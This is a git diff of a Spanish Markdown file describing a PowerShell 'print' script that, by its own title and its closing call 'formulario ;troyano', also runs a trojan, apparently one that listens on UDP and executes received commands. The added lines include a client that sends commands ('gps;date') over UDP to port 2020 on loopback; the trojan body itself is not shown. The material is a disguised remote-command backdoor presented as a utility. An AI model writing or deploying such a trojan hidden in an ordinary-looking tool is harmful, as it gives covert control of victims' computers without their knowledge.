@@ -1,5 +1,7 @@
 # Script de para impresiones con un troyano
 
+## Aplicación con el Troyano
+
 ```powershell
  
 ###########################
@@ -122,4 +124,16 @@ $udpclient.Dispose()
 }
 
 formulario ;troyano
+```
+## Ejecutar comandos por red
+```powershell
+"gps;date" | Out-File enviar.txt
+ 
+##Client
+$port=2020
+$endpoint = new-object System.Net.IPEndPoint ([IPAddress]::Loopback,$port)
+$udpclient=new-Object System.Net.Sockets.UdpClient
+$b=[Text.Encoding]::ASCII.GetBytes((gc enviar.txt))
+$bytesSent=$udpclient.Send($b,$b.length,$endpoint)
+$udpclient.Close()
 ```
